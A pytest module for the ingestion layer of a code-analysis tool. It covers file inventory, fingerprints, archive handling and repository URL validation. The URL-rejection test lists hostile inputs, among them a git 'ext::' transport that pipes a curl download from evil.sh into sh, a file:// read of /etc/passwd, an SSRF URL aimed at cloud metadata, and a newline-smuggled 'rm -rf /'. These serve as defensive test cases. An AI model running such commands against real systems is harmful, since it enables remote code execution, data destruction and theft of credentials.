"""Inventory construction, service orchestration and repository URL validation."""

from __future__ import annotations

import zipfile
from pathlib import Path

import pytest

from codesmell.config.settings import IngestionSettings, Settings
from codesmell.container import Container
from codesmell.core.enums import BuildTool, Language, SourceKind
from codesmell.core.errors import (
    EmptyProjectError,
    InvalidRepositoryUrlError,
    UnsupportedSourceError,
)
from codesmell.core.models import ProjectInventory
from codesmell.ingestion.git import GitRepositoryFetcher
from codesmell.ingestion.inventory import ProjectInventoryBuilder
from codesmell.ingestion.service import IngestionService


@pytest.fixture
def builder(ingestion_settings: IngestionSettings) -> ProjectInventoryBuilder:
    return ProjectInventoryBuilder(ingestion_settings)


@pytest.fixture
def service(
    ingestion_settings: IngestionSettings, workspace
) -> IngestionService:
    return IngestionService(ingestion_settings, workspace)


# --------------------------------------------------------------------- #
# Inventory
# --------------------------------------------------------------------- #


def test_inventory_finds_first_party_source_only(
    builder: ProjectInventoryBuilder, sample_project: Path
):
    inventory = builder.build(
        sample_project, name="sample", source_kind=SourceKind.DIRECTORY
    )
    paths = {f.relative_path for f in inventory.source_files}

    assert paths == {
        "src/app/__init__.py",
        "src/app/service.py",
        "src/app/models.py",
        "tests/test_service.py",
    }


@pytest.mark.parametrize(
    "excluded",
    [
        "venv/lib/python3.11/site-packages/requests/api.py",
        "build/generated.py",
        "node_modules/left-pad/index.js",
        "src/app/schema_pb2.py",
        "src/app/__pycache__/service.cpython-311.pyc",
        "README.md",
    ],
)
def test_inventory_excludes_noise(
    builder: ProjectInventoryBuilder, sample_project: Path, excluded: str
):
    inventory = builder.build(
        sample_project, name="sample", source_kind=SourceKind.DIRECTORY
    )
    assert excluded not in {f.relative_path for f in inventory.source_files}


def test_inventory_reports_language_and_build_tools(
    builder: ProjectInventoryBuilder, sample_project: Path
):
    inventory = builder.build(
        sample_project, name="sample", source_kind=SourceKind.DIRECTORY
    )
    assert inventory.primary_language is Language.PYTHON
    assert BuildTool.POETRY in inventory.build_tools
    assert BuildTool.PIP in inventory.build_tools


def test_inventory_collects_dependencies_from_both_manifests(
    builder: ProjectInventoryBuilder, sample_project: Path
):
    inventory = builder.build(
        sample_project, name="sample", source_kind=SourceKind.DIRECTORY
    )
    assert {"fastapi", "sqlalchemy", "pandas", "numpy"} <= set(
        inventory.dependencies
    )


def test_inventory_does_not_follow_symlinks(
    builder: ProjectInventoryBuilder, sample_project: Path, tmp_path: Path
):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.py").write_text("SECRET = 1\n", encoding="utf-8")
    try:
        (sample_project / "src" / "linked").symlink_to(outside, target_is_directory=True)
    except OSError as exc:
        pytest.skip(f"Symlinks not supported: {exc}")

    inventory = builder.build(
        sample_project, name="sample", source_kind=SourceKind.DIRECTORY
    )
    assert all("linked" not in f.relative_path for f in inventory.source_files)


def test_inventory_refuses_project_with_no_source(
    builder: ProjectInventoryBuilder, tmp_path: Path
):
    empty = tmp_path / "docs-only"
    empty.mkdir()
    (empty / "README.md").write_text("# nothing here\n", encoding="utf-8")

    with pytest.raises(EmptyProjectError):
        builder.build(empty, name="docs", source_kind=SourceKind.DIRECTORY)


def test_inventory_unwraps_github_style_single_wrapper(
    builder: ProjectInventoryBuilder, tmp_path: Path
):
    """GitHub ZIPs nest everything under repo-main/; paths must not inherit it."""
    root = tmp_path / "extracted"
    inner = root / "myrepo-main"
    (inner / "app").mkdir(parents=True)
    (inner / "app" / "main.py").write_text("x = 1\n", encoding="utf-8")

    inventory = builder.build(
        builder.resolve_root(root), name="myrepo", source_kind=SourceKind.ARCHIVE
    )
    assert [f.relative_path for f in inventory.source_files] == ["app/main.py"]


def test_relative_paths_are_posix_style(
    builder: ProjectInventoryBuilder, sample_project: Path
):
    inventory = builder.build(
        sample_project, name="sample", source_kind=SourceKind.DIRECTORY
    )
    assert all("\\" not in f.relative_path for f in inventory.source_files)


# --------------------------------------------------------------------- #
# Fingerprint
# --------------------------------------------------------------------- #


def test_fingerprint_is_stable_across_repeated_scans(
    builder: ProjectInventoryBuilder, sample_project: Path
):
    first = builder.build(
        sample_project, name="s", source_kind=SourceKind.DIRECTORY
    )
    second = builder.build(
        sample_project, name="s", source_kind=SourceKind.DIRECTORY
    )
    assert first.fingerprint == second.fingerprint


def test_fingerprint_changes_when_content_changes(
    builder: ProjectInventoryBuilder, sample_project: Path
):
    before = builder.build(
        sample_project, name="s", source_kind=SourceKind.DIRECTORY
    ).fingerprint

    (sample_project / "src" / "app" / "service.py").write_text(
        "class OrderService:\n    def place(self, order):\n        return None\n",
        encoding="utf-8",
    )
    after = builder.build(
        sample_project, name="s", source_kind=SourceKind.DIRECTORY
    ).fingerprint

    assert before != after, "a stale fingerprint would serve stale cached features"


def test_fingerprint_changes_when_a_file_is_renamed(
    builder: ProjectInventoryBuilder, sample_project: Path
):
    before = builder.build(
        sample_project, name="s", source_kind=SourceKind.DIRECTORY
    ).fingerprint

    app = sample_project / "src" / "app"
    (app / "service.py").rename(app / "orders.py")
    after = builder.build(
        sample_project, name="s", source_kind=SourceKind.DIRECTORY
    ).fingerprint

    assert before != after


# --------------------------------------------------------------------- #
# Service dispatch
# --------------------------------------------------------------------- #


def test_service_ingests_directory(service: IngestionService, sample_project: Path):
    result = service.ingest(sample_project)
    assert result.inventory.source_kind is SourceKind.DIRECTORY
    assert result.inventory.file_count == 4


def test_service_ingests_archive(
    service: IngestionService, tmp_path: Path
):
    archive = tmp_path / "proj.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        zf.writestr("proj/app/__init__.py", "")
        zf.writestr("proj/app/main.py", "def main():\n    return 0\n")
        zf.writestr("proj/README.md", "# hi\n")

    result = service.ingest(archive)

    assert result.inventory.source_kind is SourceKind.ARCHIVE
    assert {f.relative_path for f in result.inventory.source_files} == {
        "app/__init__.py",
        "app/main.py",
    }


def test_service_ingests_single_file(service: IngestionService, tmp_path: Path):
    module = tmp_path / "lonely.py"
    module.write_text("class A:\n    pass\n", encoding="utf-8")

    result = service.ingest(module)

    assert result.inventory.source_kind is SourceKind.SINGLE_FILE
    assert result.inventory.file_count == 1


def test_service_rejects_unknown_source(service: IngestionService):
    with pytest.raises(UnsupportedSourceError):
        service.ingest("/definitely/not/a/real/path")


def test_service_warns_on_small_project(service: IngestionService, tmp_path: Path):
    module = tmp_path / "tiny.py"
    module.write_text("x = 1\n", encoding="utf-8")

    result = service.ingest(module)

    assert any("source file" in w for w in result.warnings)


def test_service_warns_when_language_has_no_parser(
    service: IngestionService, tmp_path: Path
):
    """Java has no adapter until M2b; the user must be told, not misled."""
    project = tmp_path / "javaproj"
    project.mkdir()
    (project / "Main.java").write_text(
        "public class Main { public static void main(String[] a) {} }\n",
        encoding="utf-8",
    )

    result = service.ingest(project)

    assert result.inventory.primary_language is Language.JAVA
    assert any("no parser adapter" in w for w in result.warnings)


# --------------------------------------------------------------------- #
# Repository URL validation (no network access required)
# --------------------------------------------------------------------- #


@pytest.fixture
def fetcher(ingestion_settings: IngestionSettings) -> GitRepositoryFetcher:
    return GitRepositoryFetcher(ingestion_settings)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/psf/requests",
        "https://github.com/psf/requests.git",
        "https://gitlab.com/group/project",
        "https://bitbucket.org/team/repo",
    ],
)
def test_accepts_allowlisted_https_urls(fetcher: GitRepositoryFetcher, url: str):
    assert fetcher.validate(url) == url


@pytest.mark.parametrize(
    ("url", "why"),
    [
        ("file:///etc/passwd", "file:// would read the host disk"),
        ("git://github.com/psf/requests", "git:// bypasses TLS"),
        ("ssh://git@github.com/psf/requests", "ssh:// bypasses TLS"),
        ("ext::sh -c 'curl evil.sh|sh'", "ext:: executes a shell command"),
        ("http://github.com/psf/requests", "plaintext http is refused"),
        ("https://user:token@github.com/a/b", "embedded credentials leak"),
        ("https://169.254.169.254/latest/meta-data", "SSRF to cloud metadata"),
        ("https://localhost/repo/x", "SSRF to a local service"),
        ("https://internal.corp/repo/x", "host not on the allowlist"),
        ("https://github.com/onlyone", "not an owner/repo path"),
        ("https://github.com:8080/a/b", "non-standard port"),
        ("", "empty URL"),
        ("https://github.com/a/b\nrm -rf /", "control characters"),
    ],
)
def test_rejects_dangerous_repository_urls(
    fetcher: GitRepositoryFetcher, url: str, why: str
):
    with pytest.raises(InvalidRepositoryUrlError):
        fetcher.validate(url)
    assert not fetcher.supports(url), why


def test_repository_name_is_derived_safely(fetcher: GitRepositoryFetcher):
    assert fetcher.repository_name("https://github.com/psf/requests.git") == "requests"
    assert fetcher.repository_name("https://github.com/a/b") == "b"


def test_allow_any_host_opens_the_allowlist_for_local_research():
    permissive = GitRepositoryFetcher(
        IngestionSettings(git_allow_any_host=True)
    )
    assert permissive.supports("https://internal.corp/team/repo")
    assert not permissive.supports("file:///etc/passwd"), (
        "scheme restriction must hold even with the host allowlist disabled"
    )


# --------------------------------------------------------------------- #
# Container wiring
# --------------------------------------------------------------------- #


def test_container_wires_ingestion_end_to_end(
    settings: Settings, sample_project: Path
):
    container = Container(settings)
    with container.workspaces.session() as workspace:
        result = container.ingestion_service(workspace).ingest(sample_project)

    assert isinstance(result.inventory, ProjectInventory)
    assert result.inventory.file_count == 4


def test_container_describes_its_wiring(settings: Settings):
    described = Container(settings).describe()
    assert described["parsers"] == 1, "the Python parser is registered at M2"
    assert described["metric_calculators"] > 0
    assert described["detectors"] == described["rules"] > 0, (
        "M3 registers one rule-based detector per loaded rule"
    )
    assert described["supported_languages"] == ["python"]


def test_unwrapping_does_not_descend_past_a_source_root(
    builder: ProjectInventoryBuilder, tmp_path: Path
):
    """Regression: a greedy unwrapper walked root/src/app/ down to app/,
    silently stripping the path prefixes the metrics engine keys on."""
    root = tmp_path / "proj"
    (root / "src" / "app").mkdir(parents=True)
    (root / "src" / "app" / "main.py").write_text("x = 1\n", encoding="utf-8")

    inventory = builder.build(
        builder.resolve_root(root), name="p", source_kind=SourceKind.DIRECTORY
    )

    assert [f.relative_path for f in inventory.source_files] == ["src/app/main.py"]


def test_unsupported_language_is_inventoried_not_discarded(
    builder: ProjectInventoryBuilder, tmp_path: Path
):
    """Regression: filtering the census down to parseable languages made a
    Java project fail as 'no source files' instead of reporting what it is."""
    root = tmp_path / "javaproj"
    root.mkdir()
    (root / "Main.java").write_text("public class Main {}\n", encoding="utf-8")

    inventory = builder.build(root, name="j", source_kind=SourceKind.DIRECTORY)

    assert inventory.primary_language is Language.JAVA
    assert inventory.file_count == 1
